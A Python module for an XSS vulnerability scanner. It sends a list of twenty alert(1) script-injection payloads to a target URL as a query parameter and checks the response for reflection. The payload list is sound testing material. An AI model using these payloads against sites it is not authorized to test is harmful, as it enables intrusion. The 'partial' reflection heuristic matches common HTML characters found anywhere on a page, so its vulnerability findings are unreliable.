"""
XSS Tester Module - Cross-Site Scripting Vulnerability Scanner
⚠️ EDUCATIONAL USE ONLY - Authorized Testing Only

Safe, non-destructive XSS testing using reflection detection
"""

import httpx
import asyncio
from typing import Dict, List
from urllib.parse import quote
import html


class XSSTester:
    """Cross-Site Scripting vulnerability tester"""
    
    def __init__(self, url: str):
        self.url = url
        self.user_agent = "NeoxSecBot-XSS-Scanner"
        
        # Safe XSS payloads for detection
        self.payloads = [
            "<script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "javascript:alert(1)",
            "';alert(1);//",
            '"><img src=x onerror=alert(1)>',
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "'-alert(1)-'",
            '"-alert(1)-"',
            "</script><script>alert(1)</script>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
        ]
    
    async def get_baseline(self) -> Dict:
        """Get baseline response for comparison"""
        try:
            async with httpx.AsyncClient(follow_redirects=True, timeout=10) as client:
                response = await client.get(
                    self.url,
                    headers={'User-Agent': self.user_agent}
                )
                
                return {
                    'status': response.status_code,
                    'content': response.text,
                    'length': len(response.text)
                }
        except Exception as e:
            return {
                'status': 0,
                'content': '',
                'length': 0,
                'error': str(e)
            }
    
    def check_reflection(self, payload: str, response_content: str) -> Dict:
        """
        Check if payload is reflected in response
        
        Returns dict with:
        - reflected: bool
        - snippet: str (portion of HTML showing reflection)
        - unescaped: bool (if dangerous chars are unescaped)
        """
        # Check for exact reflection
        if payload in response_content:
            # Find snippet around the reflection
            index = response_content.find(payload)
            start = max(0, index - 50)
            end = min(len(response_content), index + len(payload) + 50)
            snippet = response_content[start:end]
            
            return {
                'reflected': True,
                'snippet': snippet,
                'unescaped': True,
                'type': 'exact'
            }
        
        # Check for HTML-encoded reflection
        encoded_payload = html.escape(payload)
        if encoded_payload in response_content and encoded_payload != payload:
            index = response_content.find(encoded_payload)
            start = max(0, index - 50)
            end = min(len(response_content), index + len(encoded_payload) + 50)
            snippet = response_content[start:end]
            
            return {
                'reflected': True,
                'snippet': snippet,
                'unescaped': False,
                'type': 'encoded'
            }
        
        # Check for partial reflection (dangerous chars)
        dangerous_chars = ['<', '>', '"', "'", 'script', 'onerror', 'onload']
        found_chars = []
        
        for char in dangerous_chars:
            if char in payload and char in response_content:
                # Check if it's actually from our payload (simple heuristic)
                if payload.count(char) > 0:
                    found_chars.append(char)
        
        if len(found_chars) >= 2:  # At least 2 dangerous chars found
            return {
                'reflected': True,
                'snippet': f"Found chars: {', '.join(found_chars)}",
                'unescaped': True,
                'type': 'partial'
            }
        
        return {
            'reflected': False,
            'snippet': '',
            'unescaped': False,
            'type': 'none'
        }
    
    async def test_payload(self, payload: str) -> Dict:
        """Test a single XSS payload"""
        try:
            # Add payload as GET parameter
            test_url = f"{self.url}{'&' if '?' in self.url else '?'}xss={quote(payload)}"
            
            async with httpx.AsyncClient(follow_redirects=True, timeout=10) as client:
                response = await client.get(
                    test_url,
                    headers={'User-Agent': self.user_agent}
                )
                
                status = response.status_code
                content = response.text
                
                # Check for reflection
                reflection = self.check_reflection(payload, content)
                
                if reflection['reflected']:
                    return {
                        'vulnerable': True,
                        'payload': payload,
                        'snippet': reflection['snippet'],
                        'unescaped': reflection['unescaped'],
                        'type': reflection['type'],
                        'status': status
                    }
                
                return {
                    'vulnerable': False,
                    'payload': payload,
                    'status': status
                }
        
        except Exception as e:
            return {
                'vulnerable': False,
                'payload': payload,
                'error': str(e)
            }
    
    async def test_all_payloads(self, progress_callback=None) -> Dict:
        """Test all XSS payloads and return results"""
        results = {
            'url': self.url,
            'vulnerable': False,
            'reflections': [],
            'total_payloads': len(self.payloads),
            'tested': 0
        }
        
        try:
            # Get baseline
            if progress_callback:
                await progress_callback("Getting baseline response...")
            
            baseline = await self.get_baseline()
            
            if 'error' in baseline:
                return {
                    'status': 'error',
                    'message': f"Failed to connect to target: {baseline['error']}"
                }
            
            # Test each payload
            for i, payload in enumerate(self.payloads, 1):
                if progress_callback:
                    await progress_callback(f"Testing payload {i}/{len(self.payloads)}...")
                
                result = await self.test_payload(payload)
                results['tested'] = i
                
                if result.get('vulnerable'):
                    results['vulnerable'] = True
                    results['reflections'].append({
                        'payload': result['payload'],
                        'snippet': result['snippet'],
                        'unescaped': result['unescaped'],
                        'type': result['type']
                    })
                
                # Small delay to avoid overwhelming the server
                await asyncio.sleep(0.2)
            
            return {
                'status': 'success',
                'results': results
            }
        
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }


async def test_xss(url: str, progress_callback=None) -> Dict:
    """
    Test URL for XSS vulnerabilities using safe payloads
    
    Args:
        url: Target URL to test
        progress_callback: Optional async callback for progress updates
    
    Returns:
        Dict with status, results, vulnerable flag, and reflections
    """
    tester = XSSTester(url)
    return await tester.test_all_payloads(progress_callback)
